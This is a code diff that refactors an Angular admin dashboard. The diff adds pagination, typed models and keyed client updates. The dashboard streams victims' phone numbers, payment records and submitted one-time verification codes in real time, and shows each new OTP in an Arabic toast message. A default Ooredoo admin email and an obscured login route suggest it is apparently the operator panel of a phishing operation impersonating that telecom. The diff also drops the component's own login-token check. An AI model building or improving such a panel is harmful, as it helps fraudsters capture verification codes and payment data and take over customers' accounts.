@@ -1,31 +1,53 @@
 import {
+  ChangeDetectionStrategy,
   Component,
   OnInit,
   OnDestroy,
   signal,
+  computed,
   inject,
 } from '@angular/core';
-import { CommonModule } from '@angular/common';
+import { CommonModule, DatePipe } from '@angular/common';
 import { Router } from '@angular/router';
 import { Subscription } from 'rxjs';
 import { ToastService } from '../../services/toast';
 import { DashboardWebsocketService } from '../../services/dashboard-websocket';
 import { enviroment } from '../../../env/enviroment';
+import { Client } from '../../models/client';
+import { Payment } from '../../models/payment';
+import { Otp } from '../../models/otp';
+import { Pagination } from '../../models/pagination';
+
+const PAGE_LIMIT = 50;
 
 @Component({
   selector: 'app-dashboard',
   standalone: true,
-  imports: [CommonModule],
+  imports: [CommonModule, DatePipe],
   templateUrl: './dashboard.html',
   styleUrl: './dashboard.css',
+  changeDetection: ChangeDetectionStrategy.OnPush,
 })
 export class Dashboard implements OnInit, OnDestroy {
   private readonly toastService = inject(ToastService);
   private readonly router = inject(Router);
   private readonly wsService = inject(DashboardWebsocketService);
 
-  readonly clients = signal<any[]>([]);
   readonly adminEmail = signal<string>('');
+
+  /** O(1) lookup & update: keyed by client id */
+  private readonly clientMap = signal<Map<string, Client>>(new Map());
+
+  /** Sorted list derived from the map – newest first */
+  readonly clients = computed<Client[]>(() =>
+    Array.from(this.clientMap().values()).sort(
+      (a, b) => new Date(b.created_at).getTime() - new Date(a.created_at).getTime()
+    )
+  );
+
+  readonly isLoading = signal<boolean>(false);
+  readonly errorMessage = signal<string>('');
+  readonly pagination = signal<Pagination | null>(null);
 
   /** WebSocket connection status */
   readonly wsConnected = signal<boolean>(false);
@@ -38,14 +60,9 @@ export class Dashboard implements OnInit, OnDestroy {
     const token = localStorage.getItem('admin_token');
     const email = localStorage.getItem('admin_email');
 
-    if (!token) {
-      this.router.navigate(['/93ceb7962cf40688f3c465ba57ff7286893fd19e']);
-      return;
-    }
-
     this.adminEmail.set(email || 'admin@ooredoo.com');
     this.loadData();
-    this.connectWebSocket(token);
+    this.connectWebSocket(token!);
   }
 
   ngOnDestroy(): void {
@@ -55,28 +72,44 @@ export class Dashboard implements OnInit, OnDestroy {
 
   // ── Data loading ──────────────────────────────────────────────────────
 
-  async loadData(): Promise<void> {
+  async loadData(offset = 0): Promise<void> {
     const token = localStorage.getItem('admin_token');
+    this.isLoading.set(true);
+    this.errorMessage.set('');
+
     try {
       const response = await fetch(
-        enviroment.api_base + '/api/clients?include=payments,otps',
+        `${enviroment.api_base}/api/clients?include=payments,otps&limit=${PAGE_LIMIT}&offset=${offset}`,
         { headers: { Authorization: `Bearer ${token}` } }
       );
       const resData = await response.json();
+
       if (resData.success) {
-        const sorted = resData.data.sort(
-          (a: any, b: any) =>
-            new Date(b.created_at).getTime() - new Date(a.created_at).getTime()
-        );
-        this.clients.set(sorted);
+        const newMap = new Map<string, Client>(this.clientMap());
+        for (const client of resData.data as Client[]) {
+          newMap.set(client.id, client);
+        }
+        this.clientMap.set(newMap);
+        this.pagination.set(resData.pagination ?? null);
       } else {
+        this.errorMessage.set(resData.error || 'فشل تحميل البيانات');
         this.toastService.show(resData.error || 'فشل تحميل البيانات', 'error');
         if (response.status === 401 || response.status === 403) {
           this.logout();
         }
       }
     } catch {
+      this.errorMessage.set('خطأ في الاتصال بالخادم لتحميل البيانات');
       this.toastService.show('خطأ في الاتصال بالخادم لتحميل البيانات', 'error');
+    } finally {
+      this.isLoading.set(false);
+    }
+  }
+
+  loadNextPage(): void {
+    const p = this.pagination();
+    if (p && p.hasMore) {
+      this.loadData(p.offset + p.limit);
     }
   }
 
@@ -92,10 +125,14 @@ export class Dashboard implements OnInit, OnDestroy {
           break;
 
         case 'client_created': {
-          const newClient = msg.data;
-          newClient.payments = [];
-          newClient.otps = [];
-          this.clients.update((list) => [newClient, ...list]);
+          const newClient = msg.data as Client;
+          newClient.payments = newClient.payments ?? [];
+          newClient.otps = newClient.otps ?? [];
+          this.clientMap.update((map) => {
+            const updated = new Map(map);
+            updated.set(newClient.id, newClient);
+            return updated;
+          });
           this.toastService.show(
             `عميل جديد انضم: ${newClient.phone_number}`,
             'success'
@@ -104,15 +141,11 @@ export class Dashboard implements OnInit, OnDestroy {
         }
 
         case 'payment_created': {
-          const payment = msg.data;
-          this.clients.update((list) =>
-            list.map((c) => {
-              if (c.id === payment.client_id) {
-                return { ...c, payments: [...(c.payments || []), payment] };
-              }
-              return c;
-            })
-          );
+          const payment = msg.data as Payment;
+          this.updateClient(payment.client_id, (c) => ({
+            ...c,
+            payments: [...(c.payments ?? []), payment],
+          }));
           this.toastService.show(
             `طلب دفع جديد للعميل صاحب الرقم ${this.getClientPhone(payment.client_id)}`,
             'info'
@@ -121,33 +154,22 @@ export class Dashboard implements OnInit, OnDestroy {
         }
 
         case 'payment_updated': {
-          const payment = msg.data;
-          this.clients.update((list) =>
-            list.map((c) => {
-              if (c.id === payment.client_id) {
-                return {
-                  ...c,
-                  payments: (c.payments || []).map((p: any) =>
-                    p.id === payment.id ? payment : p
-                  ),
-                };
-              }
-              return c;
-            })
-          );
+          const payment = msg.data as Payment;
+          this.updateClient(payment.client_id, (c) => ({
+            ...c,
+            payments: (c.payments ?? []).map((p) =>
+              p.id === payment.id ? payment : p
+            ),
+          }));
           break;
         }
 
         case 'otp_created': {
-          const otp = msg.data;
-          this.clients.update((list) =>
-            list.map((c) => {
-              if (c.id === otp.client_id) {
-                return { ...c, otps: [...(c.otps || []), otp] };
-              }
-              return c;
-            })
-          );
+          const otp = msg.data as Otp;
+          this.updateClient(otp.client_id, (c) => ({
+            ...c,
+            otps: [...(c.otps ?? []), otp],
+          }));
           this.toastService.show(
             `رمز تحقق جديد تم تقديمه: ${otp.otp}`,
             'info'
@@ -156,20 +178,11 @@ export class Dashboard implements OnInit, OnDestroy {
         }
 
         case 'otp_updated': {
-          const otp = msg.data;
-          this.clients.update((list) =>
-            list.map((c) => {
-              if (c.id === otp.client_id) {
-                return {
-                  ...c,
-                  otps: (c.otps || []).map((o: any) =>
-                    o.id === otp.id ? otp : o
-                  ),
-                };
-              }
-              return c;
-            })
-          );
+          const otp = msg.data as Otp;
+          this.updateClient(otp.client_id, (c) => ({
+            ...c,
+            otps: (c.otps ?? []).map((o) => (o.id === otp.id ? otp : o)),
+          }));
           break;
         }
       }
@@ -197,18 +210,28 @@ export class Dashboard implements OnInit, OnDestroy {
   // ── Utilities ─────────────────────────────────────────────────────────
 
   getClientPhone(clientId: string): string {
-    const found = this.clients().find((c) => c.id === clientId);
-    return found ? found.phone_number : 'غير معروف';
+    return this.clientMap().get(clientId)?.phone_number ?? 'غير معروف';
   }
 
-  getLatestPayment(client: any): any {
-    if (!client.payments || client.payments.length === 0) return null;
+  getLatestPayment(client: Client): Payment | null {
+    if (!client.payments?.length) return null;
     return client.payments[client.payments.length - 1];
   }
 
-  getLatestOtp(client: any): any {
-    if (!client.otps || client.otps.length === 0) return null;
+  getLatestOtp(client: Client): Otp | null {
+    if (!client.otps?.length) return null;
     return client.otps[client.otps.length - 1];
+  }
+
+  /** O(1) in-place update for a single client inside the Map */
+  private updateClient(clientId: string, updater: (c: Client) => Client): void {
+    this.clientMap.update((map) => {
+      const client = map.get(clientId);
+      if (!client) return map;
+      const updated = new Map(map);
+      updated.set(clientId, updater(client));
+      return updated;
+    });
   }
 
   logout(): void {
